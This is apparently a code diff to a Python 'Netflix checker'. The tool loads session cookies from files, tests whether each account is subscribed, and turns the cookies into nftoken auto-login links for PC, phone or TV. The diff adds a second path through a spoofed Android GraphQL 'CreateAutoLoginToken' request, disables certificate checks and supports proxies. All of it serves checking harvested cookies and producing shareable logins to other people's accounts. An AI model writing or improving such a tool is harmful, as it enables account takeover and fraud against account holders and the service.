@@ -1,5 +1,6 @@
 import html
 import re
+import logging
 import requests
 import json
 import unicodedata
@@ -7,11 +8,14 @@ import threading
 from collections import OrderedDict
 from datetime import datetime
 from typing import Optional, Dict, Any, Tuple
+from urllib.parse import quote, unquote
 from urllib3.exceptions import InsecureRequestWarning
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
 
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+
+log = logging.getLogger("NetflixChecker")
 
 _thread_local = threading.local()
 
@@ -35,6 +39,18 @@ def _get_session() -> requests.Session:
         })
         _thread_local.session = session
     return _thread_local.session
+
+def _new_token_session() -> requests.Session:
+    session = requests.Session()
+    adapter = HTTPAdapter(
+        pool_connections=4,
+        pool_maxsize=4,
+        max_retries=Retry(total=2, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504]),
+    )
+    session.mount("https://", adapter)
+    session.mount("http://", adapter)
+    session.verify = False
+    return session
 
 RE_PATTERNS = {
     'userInfo_name': re.compile(r'userInfo"\s*:\s*\{\s*"name"\s*:\s*"([^"]+)"'),
@@ -79,12 +95,35 @@ NETFLIX_COOKIE_NAMES = {
 
 LOGIN_DEVICES = ("pc", "phone", "tv")
 LOGIN_LINK_TEMPLATES = {
-    "pc": "https://netflix.com/?nftoken={token}",
-    "phone": "https://netflix.com/unsupported?nftoken={token}",
-    "tv": "https://netflix.com/tv2?nftoken={token}",
+    "pc": "https://www.netflix.com/?nftoken={token}",
+    "phone": "https://www.netflix.com/unsupported?nftoken={token}",
+    "tv": "https://www.netflix.com/tv2?nftoken={token}",
 }
 
+AUTH_COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
+
 NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
+NFTOKEN_GRAPHQL_URL = "https://android13.prod.ftl.netflix.com/graphql"
+NFTOKEN_GRAPHQL_PAYLOAD = {
+    "operationName": "CreateAutoLoginToken",
+    "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
+    "extensions": {
+        "persistedQuery": {
+            "version": 102,
+            "id": "76e97129-f4b5-41a0-a73c-12e674896849",
+        }
+    },
+}
+NFTOKEN_GRAPHQL_HEADERS = {
+    "User-Agent": (
+        "com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; "
+        "Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)"
+    ),
+    "Accept": "multipart/mixed;deferSpec=20220824, application/graphql-response+json, application/json",
+    "Content-Type": "application/json",
+    "Origin": "https://www.netflix.com",
+    "Referer": "https://www.netflix.com/",
+}
 NFTOKEN_QUERY_PARAMS = {
     "appVersion": "15.48.1",
     "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
@@ -394,10 +433,19 @@ def is_extra_member_account(info):
     return False
 
 def is_subscribed_account(info):
-    status = normalize_plan_key((info or {}).get("membershipStatus"))
+    if not isinstance(info, dict):
+        return False
+    status = normalize_plan_key(info.get("membershipStatus"))
     if status == "current_member":
         return True
-    return is_extra_member_account(info)
+    if is_extra_member_account(info):
+        return True
+    if is_on_hold_account(info):
+        return False
+    plan_name = decode_netflix_value(info.get("localizedPlanName"))
+    if plan_name and plan_name.strip().lower() not in ("", "n/a", "unknown", "free"):
+        return True
+    return False
 
 def is_on_hold_account(info):
     hold_value = format_boolean_label((info or {}).get("holdStatus"))
@@ -647,42 +695,131 @@ def extract_cookies_dict(file_content: str) -> OrderedDict:
             clean[k] = v
     return clean
 
-def create_nftoken(cookie_dict, attempts=3, proxy=None):
-    netflix_id = decode_netflix_value(cookie_dict.get("NetflixId"))
-    if not netflix_id:
+def _normalize_cookie_value(value) -> Optional[str]:
+    if value is None:
+        return None
+    text = str(value).strip()
+    if not text:
+        return None
+    if "%" in text:
+        try:
+            text = unquote(text)
+        except Exception:
+            pass
+    return text or None
+
+def _build_auth_cookie_header(cookie_dict) -> str:
+    parts = []
+    for key in AUTH_COOKIE_KEYS:
+        raw = cookie_dict.get(key) if cookie_dict else None
+        value = _normalize_cookie_value(raw)
+        if value:
+            parts.append(f"{key}={value}")
+    return "; ".join(parts)
+
+def _parse_ios_token_response(data: Dict[str, Any]) -> Tuple[Optional[str], Optional[int]]:
+    token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
+    token = decode_netflix_value(token_data.get("token"))
+    expires = token_data.get("expires")
+    if token and isinstance(expires, int) and len(str(expires)) == 13:
+        expires //= 1000
+    return token, expires if token else None
+
+def _create_nftoken_ios(cookie_header: str, attempts: int = 3, proxy=None) -> Tuple[Optional[str], Optional[int]]:
+    headers = NFTOKEN_HEADERS.copy()
+    headers["Cookie"] = cookie_header
+    session = _new_token_session()
+    try:
+        for attempt in range(1, attempts + 1):
+            try:
+                response = session.get(
+                    NFTOKEN_API_URL,
+                    params=NFTOKEN_QUERY_PARAMS,
+                    headers=headers,
+                    timeout=30,
+                    proxies=proxy,
+                    verify=False,
+                )
+                if response.status_code != 200:
+                    log.warning(f"iOS nftoken API status {response.status_code} (attempt {attempt}/{attempts})")
+                    continue
+                try:
+                    data = response.json()
+                except Exception as exc:
+                    log.warning(f"iOS nftoken JSON parse failed (attempt {attempt}/{attempts}): {exc}")
+                    continue
+                token, expires = _parse_ios_token_response(data)
+                if token:
+                    return token, expires
+                log.warning(f"iOS nftoken response had no token (attempt {attempt}/{attempts})")
+            except Exception as exc:
+                log.warning(f"iOS nftoken request failed (attempt {attempt}/{attempts}): {exc}")
+    finally:
+        session.close()
+    return None, None
+
+def _create_nftoken_graphql(cookie_dict, cookie_header: str, proxy=None) -> Tuple[Optional[str], Optional[int]]:
+    has_secure = bool(_normalize_cookie_value((cookie_dict or {}).get("SecureNetflixId")))
+    has_nfvdid = bool(_normalize_cookie_value((cookie_dict or {}).get("nfvdid")))
+    if not has_secure or not has_nfvdid:
+        log.info("Skipping GraphQL nftoken fallback: SecureNetflixId and nfvdid are required")
         return None, None
 
-    headers = NFTOKEN_HEADERS.copy()
-    headers["Cookie"] = f"NetflixId={netflix_id}"
-    session = _get_session()
-
-    for _ in range(attempts):
+    headers = NFTOKEN_GRAPHQL_HEADERS.copy()
+    headers["Cookie"] = cookie_header
+    session = _new_token_session()
+    try:
+        response = session.post(
+            NFTOKEN_GRAPHQL_URL,
+            headers=headers,
+            json=NFTOKEN_GRAPHQL_PAYLOAD,
+            timeout=30,
+            proxies=proxy,
+            verify=False,
+        )
+        if response.status_code != 200:
+            log.warning(f"GraphQL nftoken API status {response.status_code}")
+            return None, None
         try:
-            response = session.get(
-                NFTOKEN_API_URL,
-                params=NFTOKEN_QUERY_PARAMS,
-                headers=headers,
-                timeout=30,
-                proxies=proxy,
-                verify=False,
-            )
-            if response.status_code != 200:
-                continue
             data = response.json()
-            token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
-            token = decode_netflix_value(token_data.get("token"))
-            expires = token_data.get("expires")
-            if token:
-                if isinstance(expires, int) and len(str(expires)) == 13:
-                    expires //= 1000
-                return token, expires
-        except Exception:
-            continue
+        except Exception as exc:
+            log.warning(f"GraphQL nftoken JSON parse failed: {exc}")
+            return None, None
+        token = decode_netflix_value(((data.get("data") or {}).get("createAutoLoginToken")))
+        if token:
+            return token, None
+        errors = data.get("errors")
+        if errors:
+            log.warning(f"GraphQL nftoken errors: {errors}")
+        else:
+            log.warning("GraphQL nftoken response had no token")
+    except Exception as exc:
+        log.warning(f"GraphQL nftoken request failed: {exc}")
+    finally:
+        session.close()
     return None, None
+
+def create_nftoken(cookie_dict, attempts=3, proxy=None):
+    netflix_id = _normalize_cookie_value((cookie_dict or {}).get("NetflixId"))
+    if not netflix_id:
+        log.warning("create_nftoken: missing NetflixId")
+        return None, None
+
+    cookie_header = _build_auth_cookie_header(cookie_dict)
+    if not cookie_header:
+        log.warning("create_nftoken: empty auth cookie header")
+        return None, None
+
+    token, expires = _create_nftoken_ios(cookie_header, attempts=attempts, proxy=proxy)
+    if token:
+        return token, expires
+
+    log.warning("iOS nftoken API failed; trying GraphQL CreateAutoLoginToken fallback")
+    return _create_nftoken_graphql(cookie_dict, cookie_header, proxy=proxy)
 
 def build_login_link(token: str, device: str = "pc") -> str:
     template = LOGIN_LINK_TEMPLATES.get(device, LOGIN_LINK_TEMPLATES["pc"])
-    return template.format(token=token)
+    return template.format(token=quote(token, safe=""))
 
 def compute_days_left(next_billing_str: Optional[str]) -> Optional[int]:
     if not next_billing_str:
@@ -784,6 +921,7 @@ def check_cookie_file(file_path: str, device: str = "pc") -> Tuple[Optional[str]
         return None, None
 
     session = _get_session()
+    session.cookies.clear()
     for name, value in cookies_dict.items():
         session.cookies.set(name, value, domain='.netflix.com', path='/')
 
@@ -800,6 +938,7 @@ def check_cookie_file(file_path: str, device: str = "pc") -> Tuple[Optional[str]
 
     nftoken, expires = create_nftoken(cookies_dict, attempts=3)
     if not nftoken:
+        log.warning("check_cookie_file: token API failed after iOS and GraphQL attempts")
         return None, info_dict
 
     link = build_login_link(nftoken, device)
